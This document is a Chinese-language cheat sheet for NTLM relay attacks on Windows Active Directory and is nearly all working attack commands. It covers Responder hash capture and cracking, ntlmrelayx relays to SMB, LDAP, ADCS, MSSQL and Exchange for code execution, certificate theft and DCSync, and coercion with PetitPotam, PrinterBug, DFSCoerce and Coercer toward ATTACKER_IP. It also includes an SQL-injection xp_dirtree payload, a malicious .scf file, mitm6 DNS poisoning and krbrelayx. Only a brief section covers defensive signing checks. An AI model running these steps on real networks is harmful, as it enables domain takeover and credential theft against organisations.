# NTLM 中继攻击技术详解

## 1. Responder 完整配置

### 1.1 仅抓 Hash（被动模式）
```bash
# 默认模式：抓取所有 NetNTLM Hash
responder -I eth0 -dwPv

# 日志位置
ls /usr/share/responder/logs/
# 格式: SMB-NTLMv2-SSP-IP.txt

# 破解 NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# 或 john
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 1.2 配合 ntlmrelayx（中继模式）
```bash
# 1. 修改 Responder 配置，关闭 SMB 和 HTTP（让 ntlmrelayx 接管这些端口）
vi /usr/share/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. 启动 Responder
responder -I eth0 -dwPv

# 3. 另一个终端启动 ntlmrelayx
ntlmrelayx.py -tf relay_targets.txt -smb2support

# 当有认证请求到达时，ntlmrelayx 自动中继
```

## 2. ntlmrelayx 各种中继目标

### 2.1 中继到 SMB（命令执行）
```bash
# 执行命令
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\\Windows\\Temp\\out.txt"

# 执行 payload
ntlmrelayx.py -tf targets.txt -smb2support -e /path/to/payload.exe

# dump SAM（获取本地哈希）
ntlmrelayx.py -tf targets.txt -smb2support

# 交互式 shell
ntlmrelayx.py -tf targets.txt -smb2support -i
# 然后 nc 127.0.0.1 11000
```

### 2.2 中继到 LDAP/LDAPS

```bash
# Shadow Credentials（最推荐，无需额外条件）
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target TARGET$

# 中继成功后得到证书和密钥
# 使用证书获取 TGT
python3 gettgtpkinit.py -cert-pfx TARGET.pfx -pfx-pass PASSWORD DOMAIN/TARGET$ TARGET.ccache
export KRB5CCNAME=TARGET.ccache

# RBCD（基于资源的约束委派）
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user YOURCOMPUTER$

# 中继成功后，YOURCOMPUTER$ 可以模拟任意用户访问 TARGET
# 获取服务票据
impacket-getST -spn cifs/TARGET -impersonate administrator DOMAIN/YOURCOMPUTER$:PASSWORD
export KRB5CCNAME=administrator.ccache
impacket-smbexec -k -no-pass TARGET
```

### 2.3 中继到 ADCS（获取证书）

这是最强大的中继路径——可以直接拿下域控。

```bash
# 中继到 ADCS Web Enrollment
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 或指定模板
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template Machine

# 触发域控认证
python3 PetitPotam.py ATTACKER_IP DC_IP

# ntlmrelayx 输出 Base64 证书
# 保存为 .pfx 文件
echo "BASE64_CERT" | base64 -d > dc.pfx

# 用证书认证获取 TGT
certipy auth -pfx dc.pfx -dc-ip DC_IP
# 输出: DC_HOSTNAME$  NTLM Hash: aad3b435...

# 用域控机器账户 Hash 做 DCSync
impacket-secretsdump -hashes :NTLM_HASH DOMAIN/DC_HOSTNAME$@DC_IP
```

### 2.4 中继到 MSSQL
```bash
ntlmrelayx.py -t mssql://SQL_SERVER -smb2support -q "EXEC xp_cmdshell 'whoami'"
```

### 2.5 中继到 IMAP/SMTP（Exchange）
```bash
ntlmrelayx.py -t https://EXCHANGE/EWS/Exchange.asmx -smb2support
```

## 3. 强制认证技术

### 3.1 PetitPotam（MS-EFSR）
```bash
# 无需凭据版本（未修补时）
python3 PetitPotam.py ATTACKER_IP TARGET_IP

# 需要凭据版本（修补后仍可用）
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP

# 检查是否可利用
netexec smb TARGET_IP -u USER -p PASS -M petitpotam
```

### 3.2 PrinterBug（MS-RPRN）
```bash
# 需要域凭据
# 检查 Spooler 服务
rpcdump.py DOMAIN/USER:PASS@TARGET_IP | grep MS-RPRN

# 触发
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP
# 或
python3 printerbug.py DOMAIN/USER:PASS@TARGET_IP ATTACKER_IP
```

### 3.3 DFSCoerce（MS-DFSNM）
```bash
python3 dfscoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP
```

### 3.4 ShadowCoerce（MS-FSRVP）
```bash
python3 shadowcoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP
```

### 3.5 其他触发方式
```sql
-- MSSQL 触发
EXEC xp_dirtree '\\ATTACKER_IP\share';

-- 通过 SQL 注入触发
'; EXEC xp_dirtree '\\ATTACKER_IP\share'; --

-- 通过文件包含 (SCF/URL/LNK)
-- 创建 .scf 文件放到共享目录
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
```

## 4. 防御检查

```bash
# SMB 签名检查
netexec smb 10.0.0.0/24 --gen-relay-list targets_nosigning.txt

# LDAP 签名检查
netexec ldap DC_IP -u USER -p PASS -M ldap-checker

# EPA 检查
# ADCS Web Enrollment 默认无 EPA → 可中继
```

## 5. 常见问题排查

| 问题 | 原因 | 解决 |
|------|------|------|
| Relay 失败 "SMB Signing required" | 目标强制 SMB 签名 | 换目标/中继到 LDAP |
| Relay 到 LDAP 失败 | LDAP 签名/通道绑定 | 用 LDAPS (636) |
| PetitPotam 无响应 | 已修补 | 尝试 PrinterBug/DFSCoerce |
| ntlmrelayx "Connection refused" | 端口被占 | 关闭 Responder 的 SMB/HTTP |

## 6. 统一强制认证工具 — Coercer

Coercer 整合了所有已知的强制认证方法（PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce 等）：

```bash
# 扫描目标支持哪些强制认证方法
coercer scan -t DC_IP -u USER -p PASS -d DOMAIN

# 自动尝试所有方法触发认证到攻击机
coercer coerce -t DC_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN

# 指定特定方法
coercer coerce -t DC_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN \
  --filter-method-name PetitPotam
coercer coerce -t DC_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN \
  --filter-method-name DfsCoerce
```

## 7. IPv6 DNS 投毒 — mitm6

在 IPv6 启用的网络中（Windows 默认启用），通过 DHCPv6 投毒劫持 DNS：

```bash
# 启动 mitm6 投毒（劫持 DNS 解析到攻击机）
mitm6 -d DOMAIN -i eth0

# 配合 ntlmrelayx 捕获认证
# 终端 1:
mitm6 -d DOMAIN -i eth0
# 终端 2:
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker.DOMAIN \
  --delegate-access --add-computer

# mitm6 + WPAD 代理（捕获 HTTP 认证）
mitm6 -d DOMAIN -i eth0 --hsts
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker.DOMAIN -l loot
```

## 8. Kerberos 中继 — krbrelayx

当目标强制 Kerberos 认证（SMB 签名开启、NTLM 被禁用）时：

```bash
# 添加 DNS 记录指向攻击机
python3 /pentest/krbrelayx/dnstool.py -u DOMAIN\\USER -p PASS \
  -a add -r attacker.DOMAIN -d ATTACKER_IP DC_IP

# 启动 krbrelayx 监听
python3 /pentest/krbrelayx/krbrelayx.py -hashes :MACHINE_HASH \
  --krbsalt DOMAIN.LOCALmachineaccount$ -krbpass MACHINE_PASS

# 触发 Kerberos 认证（配合 PetitPotam/PrinterBug）
python3 /pentest/PetitPotam/PetitPotam.py -d DOMAIN -u USER -p PASS \
  attacker.DOMAIN@80/test DC_IP
```
